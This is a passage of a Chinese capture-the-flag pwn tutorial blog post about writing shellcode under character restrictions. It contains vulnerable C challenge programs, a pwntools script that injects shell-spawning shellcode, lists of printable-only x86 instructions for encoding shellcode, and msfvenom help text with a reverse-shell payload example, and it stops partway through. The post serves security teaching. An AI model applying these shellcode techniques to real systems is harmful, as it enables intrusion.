<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN进阶（1-3）-shellcode变形的艺术（x86和x64的转换机制：retfq） | Cyberangel-blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="题目大多数来源自：https:&#x2F;&#x2F;github.com&#x2F;ustclug&#x2F;hackergame2019-writeups&#x2F;tree&#x2F;master&#x2F;official&#x2F;Shell_%E9%AA%87%E5%AE%A2参考资料：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6645 &gt; https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;5662 &gt; https:&#x2F;&#x2F;www.cnblogs.c">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN进阶（1-3）-shellcode变形的艺术（x86和x64的转换机制：retfq）">
<meta property="og:url" content="https://cyberangel.cn/2021/01/14/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-3%EF%BC%89-shellcode%E5%8F%98%E5%BD%A2%E7%9A%84%E8%89%BA%E6%9C%AF%EF%BC%88x86%E5%92%8Cx64%E7%9A%84%E8%BD%AC%E6%8D%A2%E6%9C%BA%E5%88%B6%EF%BC%9Aretfq%EF%BC%89/index.html">
<meta property="og:site_name" content="Cyberangel-blog">
<meta property="og:description" content="题目大多数来源自：https:&#x2F;&#x2F;github.com&#x2F;ustclug&#x2F;hackergame2019-writeups&#x2F;tree&#x2F;master&#x2F;official&#x2F;Shell_%E9%AA%87%E5%AE%A2参考资料：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6645 &gt; https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;5662 &gt; https:&#x2F;&#x2F;www.cnblogs.c">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2021-01-14T01:39:35.000Z">
<meta property="article:modified_time" content="2021-07-04T09:57:13.717Z">
<meta property="article:author" content="Cyberangel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://cyberangel.cn/2021/01/14/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-3%EF%BC%89-shellcode%E5%8F%98%E5%BD%A2%E7%9A%84%E8%89%BA%E6%9C%AF%EF%BC%88x86%E5%92%8Cx64%E7%9A%84%E8%BD%AC%E6%8D%A2%E6%9C%BA%E5%88%B6%EF%BC%9Aretfq%EF%BC%89/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWN进阶（1-3）-shellcode变形的艺术（x86和x64的转换机制：retfq）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-07-04 17:57:13'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Cyberangel-blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">317</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Cyberangel-blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN进阶（1-3）-shellcode变形的艺术（x86和x64的转换机制：retfq）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-14T01:39:35.000Z" title="发表于 2021-01-14 09:39:35">2021-01-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-04T09:57:13.717Z" title="更新于 2021-07-04 17:57:13">2021-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN进阶（1-3）-shellcode变形的艺术（x86和x64的转换机制：retfq）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>题目大多数来源自：<br><a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2019-writeups/tree/master/official/Shell_%E9%AA%87%E5%AE%A2">https://github.com/ustclug/hackergame2019-writeups/tree/master/official/Shell_%E9%AA%87%E5%AE%A2</a><br>参考资料：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6645">https://xz.aliyun.com/t/6645</a> &gt; <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5662">https://xz.aliyun.com/t/5662</a> &gt; <a target="_blank" rel="noopener" href="https://www.cnblogs.com/countfatcode/archive/2004/01/13/11756258.html">https://www.cnblogs.com/countfatcode/archive/2004/01/13/11756258.html</a><br>附件：<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/18gd5tJyI5CJlVHHRvxlmAw">https://pan.baidu.com/s/18gd5tJyI5CJlVHHRvxlmAw</a>   密码: 0t0r<br>–来自百度网盘超级会员 V3 的分享</p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>假如说 pwn 题做多的话，提到 shellcode 你一定不会陌生，它是获得 shell 权限的一把钥匙。但是有的题目中会对我们输入的 shellcode 进行限制，比如说不可见字符之类的，如果碰到这种题目，我们应该怎么办？<br>我们按照调用 shellcode 的题目进行分类，总结出了几道 shellcode 的题目。</p>
<h1 id="直接调用-shellcode"><a href="#直接调用-shellcode" class="headerlink" title="直接调用 shellcode"></a>直接调用 shellcode</h1><blockquote>
<p>题目来源：<a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2019-writeups/tree/master/official/Shell_%E9%AA%87%E5%AE%A2">https://github.com/ustclug/hackergame2019-writeups/tree/master/official/Shell_%E9%AA%87%E5%AE%A2</a></p>
</blockquote>
<p>源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -z execstack -fPIE -pie -z now chall1.c -o chall1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x200</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">    ((<span class="keyword">void</span>(*)(<span class="keyword">void</span>))buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>不用自己编译，因为附件中有</p>
</blockquote>
<p>文件保护情况如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610588895114-dedff68b-1892-4f15-9ff7-6c18b83d1523.png#align=left&display=inline&height=152&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-14%2009.48.10.png&originHeight=328&originWidth=924&size=46914&status=done&style=none&width=429" alt="截屏2021-01-14 09.48.10.png"><br>虽然这道题目开启了绝大多数保护，但是没有开启 NX 保护，因此可以直接向栈上注入 shellcode，并且 shellcode 长度不超过 0x200 就好：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span> <span class="comment">#记得指定架构</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./chall1&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload=shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="利用-sandbox-禁用-system、execve-函数"><a href="#利用-sandbox-禁用-system、execve-函数" class="headerlink" title="利用 sandbox 禁用 system、execve 函数"></a>利用 sandbox 禁用 system、execve 函数</h1><p>我们的目的是拿到 flag，不一定要得到 shell 权限，因此可以构造 shellcode 实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp = open(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">read(fp,buf,<span class="number">0x30</span>)</span><br><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x30</span>)</span><br></pre></td></tr></table></figure>

<p>来读取 flag，最典型的例子是 pwnable.tw 上的 orw，之前也说过，附上链接：<br>这里就不再说了，感兴趣可以移步到文章。</p>
<h1 id="限制-shellcode-中的字符"><a href="#限制-shellcode-中的字符" class="headerlink" title="限制 shellcode 中的字符"></a>限制 shellcode 中的字符</h1><blockquote>
<p>64 位程序</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -m64 -z execstack -fPIE -pie -z now chall3.c -o chall3</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">    <span class="keyword">int</span> n, i;</span><br><span class="line">    n = read(<span class="number">0</span>, buf, <span class="number">0x400</span>);</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[i] &lt; <span class="number">32</span> || buf[i] &gt; <span class="number">126</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ((<span class="keyword">void</span>(*)(<span class="keyword">void</span>))buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，这道题对我们输入的 shellcode 进行了限制，shellcode 的每个字符都要求是可见字符，那么能用的汇编语句就大大减少了，如 32 位的 int 0x80，64 位的 syscall 都不能直接输入，我们如何来构造 shellcode？<br>参考前人的总结，此类题目可用到的汇编指令如下 ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>数据传送:</span><br><span class="line">push/pop eax…</span><br><span class="line">pusha/popa</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>算术运算:</span><br><span class="line">inc/dec eax…</span><br><span class="line">sub al, 立即数</span><br><span class="line">sub byte ptr [eax… + 立即数], al dl…</span><br><span class="line">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">sub dword ptr [eax… + 立即数], esi edi</span><br><span class="line">sub word ptr [eax… + 立即数], si di</span><br><span class="line">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">sub si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>逻辑运算:</span><br><span class="line"><span class="keyword">and</span> al, 立即数</span><br><span class="line"><span class="keyword">and</span> dword ptr [eax… + 立即数], esi edi</span><br><span class="line"><span class="keyword">and</span> word ptr [eax… + 立即数], si di</span><br><span class="line"><span class="keyword">and</span> ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class="line"><span class="keyword">and</span> esi edi, dword ptr [eax… + 立即数]</span><br><span class="line"><span class="keyword">and</span> si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="keyword">xor</span> al, 立即数</span><br><span class="line"><span class="keyword">xor</span> byte ptr [eax… + 立即数], al dl…</span><br><span class="line"><span class="keyword">xor</span> byte ptr [eax… + 立即数], ah dh…</span><br><span class="line"><span class="keyword">xor</span> dword ptr [eax… + 立即数], esi edi</span><br><span class="line"><span class="keyword">xor</span> word ptr [eax… + 立即数], si di</span><br><span class="line"><span class="keyword">xor</span> al dl…, byte ptr [eax… + 立即数]</span><br><span class="line"><span class="keyword">xor</span> ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line"><span class="keyword">xor</span> esi edi, dword ptr [eax… + 立即数]</span><br><span class="line"><span class="keyword">xor</span> si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>比较指令:</span><br><span class="line">cmp al, 立即数</span><br><span class="line">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class="line">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class="line">cmp word ptr [eax… + 立即数], si di</span><br><span class="line">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">cmp si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>转移指令:</span><br><span class="line">push <span class="number">56</span>h</span><br><span class="line">pop eax</span><br><span class="line">cmp al, <span class="number">43</span>h</span><br><span class="line">jnz lable</span><br><span class="line"></span><br><span class="line">&lt;=&gt; jmp lable</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>交换al, ah  <span class="comment">//AH是eax的高8位,而AL是eax的低8位</span></span><br><span class="line">push eax</span><br><span class="line"><span class="keyword">xor</span> ah, byte ptr [esp] <span class="comment">// ah ^= al</span></span><br><span class="line"><span class="keyword">xor</span> byte ptr [esp], ah <span class="comment">// al ^= ah</span></span><br><span class="line"><span class="keyword">xor</span> ah, byte ptr [esp] <span class="comment">// ah ^= al</span></span><br><span class="line">pop eax</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>清零:</span><br><span class="line">push <span class="number">44</span>h</span><br><span class="line">pop eax</span><br><span class="line">sub al, <span class="number">44</span>h ; eax = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">push esi</span><br><span class="line">push esp</span><br><span class="line">pop eax</span><br><span class="line"><span class="keyword">xor</span> [eax], esi ; esi = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>所以考查的是我们用上面有限的汇编指令编写出可用的 shellcode，基本思想：<br>mov a,b 用 push b;pop a 替换；而像 int 0x80 ; syscall 这种则通过 xor sub and inc dec 运算来操作 shellcode 使之变成我们要的指令；<br>当然，手动写汇编指令是一件十分麻烦的事，也可以使用工具来生成 shellcode，这个之后再说。</p>
<h1 id="进一步限制-shellcode-的字符"><a href="#进一步限制-shellcode-的字符" class="headerlink" title="进一步限制 shellcode 的字符"></a>进一步限制 shellcode 的字符</h1><blockquote>
<p>32 位程序</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -m32 -z execstack -fPIE -pie -z now chall2.c -o chall2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x200</span>];</span><br><span class="line">    <span class="keyword">int</span> n, i;</span><br><span class="line">    n = read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!((buf[i] &gt;= <span class="number">65</span> &amp;&amp; buf[i] &lt;= <span class="number">90</span>) || (buf[i] &gt;= <span class="number">48</span> &amp;&amp; buf[i] &lt;= <span class="number">57</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ((<span class="keyword">void</span>(*)(<span class="keyword">void</span>))buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目进一步缩小了 shellcode 输入的范围，要求在：A ～ Z 和 0 ～ 9 范围之内。同样也可以使用工具生成对应要求的 shellcode。<br>接下来我们看如何使用工具生成 shellcode。</p>
<h1 id="使用工具生成对应要求的-shellcode"><a href="#使用工具生成对应要求的-shellcode" class="headerlink" title="使用工具生成对应要求的 shellcode"></a>使用工具生成对应要求的 shellcode</h1><h2 id="x86-ELF（msfvenom）"><a href="#x86-ELF（msfvenom）" class="headerlink" title="x86 ELF（msfvenom）"></a>x86 ELF（msfvenom）</h2><p>先来看一下 msfvenom 的帮助：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ msfvenom -h</span><br><span class="line">MsfVenom - a Metasploit standalone payload generator.</span><br><span class="line">Also a replacement <span class="keyword">for</span> msfpayload <span class="keyword">and</span> msfencode.</span><br><span class="line">Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;</span><br><span class="line">Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    -l, --<span class="built_in">list</span>            &lt;type&gt;     List all modules <span class="keyword">for</span> [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all</span><br><span class="line">    -p, --payload         &lt;payload&gt;  Payload to use (--<span class="built_in">list</span> payloads to <span class="built_in">list</span>, --<span class="built_in">list</span>-options <span class="keyword">for</span> arguments). Specify <span class="string">&#x27;-&#x27;</span> <span class="keyword">or</span> STDIN <span class="keyword">for</span> custom</span><br><span class="line">        --<span class="built_in">list</span>-options               List --payload &lt;value&gt;<span class="string">&#x27;s standard, advanced and evasion options</span></span><br><span class="line"><span class="string">    -f, --format          &lt;format&gt;   Output format (use --list formats to list)</span></span><br><span class="line"><span class="string">    -e, --encoder         &lt;encoder&gt;  The encoder to use (use --list encoders to list)</span></span><br><span class="line"><span class="string">        --service-name    &lt;value&gt;    The service name to use when generating a service binary</span></span><br><span class="line"><span class="string">        --sec-name        &lt;value&gt;    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string</span></span><br><span class="line"><span class="string">        --smallest                   Generate the smallest possible payload using all available encoders</span></span><br><span class="line"><span class="string">        --encrypt         &lt;value&gt;    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)</span></span><br><span class="line"><span class="string">        --encrypt-key     &lt;value&gt;    A key to be used for --encrypt</span></span><br><span class="line"><span class="string">        --encrypt-iv      &lt;value&gt;    An initialization vector for --encrypt</span></span><br><span class="line"><span class="string">    -a, --arch            &lt;arch&gt;     The architecture to use for --payload and --encoders (use --list archs to list)</span></span><br><span class="line"><span class="string">        --platform        &lt;platform&gt; The platform for --payload (use --list platforms to list)</span></span><br><span class="line"><span class="string">    -o, --out             &lt;path&gt;     Save the payload to a file</span></span><br><span class="line"><span class="string">    -b, --bad-chars       &lt;list&gt;     Characters to avoid example: &#x27;</span>\x00\xff<span class="number">&#x27;</span></span><br><span class="line">    -n, --nopsled         &lt;length&gt;   Prepend a nopsled of [length] size on to the payload</span><br><span class="line">        --pad-nops                   Use nopsled size specified by -n &lt;length&gt; as the total payload size, <span class="keyword">auto</span>-prepending a nopsled of quantity (nops minus payload length)</span><br><span class="line">    -s, --space           &lt;length&gt;   The maximum size of the resulting payload</span><br><span class="line">        --encoder-space   &lt;length&gt;   The maximum size of the encoded payload (defaults to the -s value)</span><br><span class="line">    -i, --iterations      &lt;count&gt;    The number of times to encode the payload</span><br><span class="line">    -c, --add-code        &lt;path&gt;     Specify an additional win32 shellcode file to include</span><br><span class="line">    -x, --<span class="keyword">template</span>        &lt;path&gt;     Specify a custom executable file to use as a <span class="keyword">template</span></span><br><span class="line">    -k, --keep                       Preserve the --<span class="keyword">template</span> behaviour <span class="keyword">and</span> inject the payload as a <span class="keyword">new</span> thread</span><br><span class="line">    -v, --var-name        &lt;value&gt;    Specify a custom variable name to use <span class="keyword">for</span> certain output formats</span><br><span class="line">    -t, --timeout         &lt;second&gt;   The number of seconds to wait when reading the payload from STDIN (<span class="keyword">default</span> <span class="number">30</span>, <span class="number">0</span> to disable)</span><br><span class="line">    -h, --help                       Show <span class="keyword">this</span> message</span><br></pre></td></tr></table></figure>

<p>中文翻译如下，<del>自己翻译的，累死了</del></p>
